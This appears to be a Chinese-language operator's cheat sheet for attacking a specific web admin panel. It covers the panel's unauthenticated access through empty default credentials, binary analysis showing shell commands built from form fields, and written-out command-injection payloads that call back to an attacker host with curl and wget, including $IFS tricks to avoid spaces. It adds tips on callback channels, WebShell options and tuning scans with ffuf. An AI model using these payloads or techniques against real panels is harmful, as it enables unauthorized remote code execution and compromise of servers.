# cmwall / target318.example.com 「服务设置向导面板」wizard 静态分析速查（复用）
# 目标特征：38888 端口、首页 372B「本面板默认用户名和密码都为空」、/service_manage.html 直接 200

## 0. 厂商情报（公开，只读）
厂商站:      https://example.com/            # 订购/License（/services.html /downloads.html 仅 Google 登录）
公开帮助文档: /help_cmwall.html /help_wizard.html /help_general.html /help_real301(-multi).html
                                    /help_js301.html /help_js301tohttps.html /help_cmwallhttp.html
安装脚本:    https://raw.githubusercontent.com/peopleassistant/655665xyz/main/launcher.sh
全部版本包:  https://github.com/peopleassistant/655665xyz/releases/download/<vX.Y>/wizard.tar.gz
             （另含 cmwall.tar.gz / geneva.tar.gz / js301.tar.gz / real301.tar.gz / real301multi.tar.gz）
面板源码片段: js301tohttps.go（同仓库，公开；只解析 -laddr/-cwait，无 shell 无文件操作）

## 1. 面板部署事实（由 launcher.sh + help_wizard.html 得来，判断"打到哪里/读什么")
安装目录:   /opt/target318.example.com
版本目录:   /opt/target318.example.com/<版本>/panel（当前 example.com）
配置:       wizard.config.json → { ListenAddr, Username, Password, ProbeIPv4URL, ProbeIPv6URL,
                                  DatabasePath, ChainPrefix }
数据:       /opt/target318.example.com/database/database.json   ← 服务/授权配置库（拿到 shell 的第一读取目标）
启动:       nohup ./wizard wizard.config.json ；一键脚本安装到 /opt/target318.example.com/startup.sh
默认:       0.0.0.0:8080（本靶标被改成 38888）且 Username/Password 为空 → 未授权读写
服务二进制: panel/../bin/{cmwall,cmwallhttp,geneva,js301,js301tohttps,real301,real301multi}

## 2. ★命令注入的实现基础（wizard example.com 二进制 UPX 解包后字符串，179,351 条中命中）
# 解包: upx -d wizard（3,439,708B → 8,810,680B, ELF x86-64）
# 符号: os/exec, os/exec.Command, os.StartProcess, syscall.StartProcess, StdoutPipe, CombinedOutput
# 关键: 存在裸 "sh"（sh\x00 95 处）与 "-c"（3 处），/bin/sh 与 bash 均 0 处 ⇒ exec.Command("sh","-c",拼接串) 形态
cd run && date >> service_<name>.log 2>&1 && exec ../bin/geneva -l <license> …
cd run && date >> service_js301.log 2>&1 && exec ../bin/js301 …
cd run && date >> service_js301tohttps.log 2>&1 && exec ../bin/js301tohttps -laddr …
cd run && date >> service_<name>.log 2>&1 && exec ../bin/real301 -l <license> …
/service_update_bypass_chinamobile_new.log 2>&1 && exec ../bin/real301multi …
.log 2>&1 && exec ../bin/cmwall -l <license> -q <queue_num> …        # 附加 -perfs/-nmanses/-vd/-w 0
/service_update_301multi; iptables -D OUTPUT -j <chain>; iptables -I OUTPUT -j <chain> \
        -j CONNMARK --set-mark <q> -j NFQUEUE --queue-num <q>
iptables -t nat -N/-A/-F/-X/-I PREROUTING <chain> ; iptables -F >> service_<…>
-p tcp --dport <listen_port> && iptables -A <chain> -p tcp --sport <listen_port> -m mark --mark <q>
invalid_service_ip ; port_not_usable ; /service_start_stop ; /service_delete ; /service_edit_*
⇒ 表单字段 name/license/queue_num/listen_ports/addi_params/redir_mapping 未过滤地拼进 shell 命令行
   ⇒ 注入 payload 形如： name = "x;curl http://IP:PORT/rt-<rnd>"  或  listen_ports = "80;id>/tmp/x"

## 3. 注入验证要点（踩过的坑）
- 面板 update 是 **upsert 且服务端零字段校验**，恒返回 302 ⇒ 必须靠"读回页面比对/SHA256"判定是否落库
- `service_delete` 对**已启动**服务不生效（HTTP 200 不删）；必须先 `service_start_stop {id}` 停止（302）再删
- **验证必须用"自建 canary 服务"**（非生产端口，如 39999 + `.invalid`），验证完 stop→delete 并比对
  service_manage.html 的 SHA256 与基线一致；**绝不碰现有服务的字段/启停**
- 命令模板含 `cd run`（相对工作目录）+ `>> service_<name>.log` ⇒ payload 里带空格/引号易被拆词，
  优先用无空格形式（`;curl${IFS}http://IP:PORT/x` 或 `;wget$IFS-O$IFS/tmp/x$IFShttp://…`）
- **回连通道**：若目标出网受限，HTTP/DNS 外带都会 0 回连（本靶标即如此）；此时需要
  ① 目标可达的监听点（VPS），或 ② 自持回读（payload 把结果写入目标对外提供的文件再取回，需授权）

## 4. 通用判据/避坑
- 未知路径统一 302→/example.com；只认已知页面集合
- 面板无外部 JS、无上传/导出/备份/日志页 ⇒ 想直接从面板落 WebShell 走不通（**只能靠命令注入**）
- 面板能"全站 301/JS 跳转劫持 + 过墙参数控制 + 远程启停服务"，但**没有任何转发/upstream 字段 → 不能建隧道**
- 扫描/爆破时：ffuf 默认 UA 会被 nginx 统一 403（body 长度随 UA 变化 = UA 白名单实证）；
  噪声过滤集必须含：SPA 兜底 13140、nginx 502 524/176442、403/404 548/176451、Tomcat 500 455、
  **Spring 404 JSON 111–130B**、301/302 的 162/0
- Windows 下 curl 走代理常见 `CRYPT_E_REVOCATION_OFFLINE(0x80092013)` → 加 `--ssl-no-revoke`；
  本作业代理 `127.0.0.1:7892` 是 **mixed 端口（同时支持 HTTP 与 SOCKS5）**，可发原始 TCP payload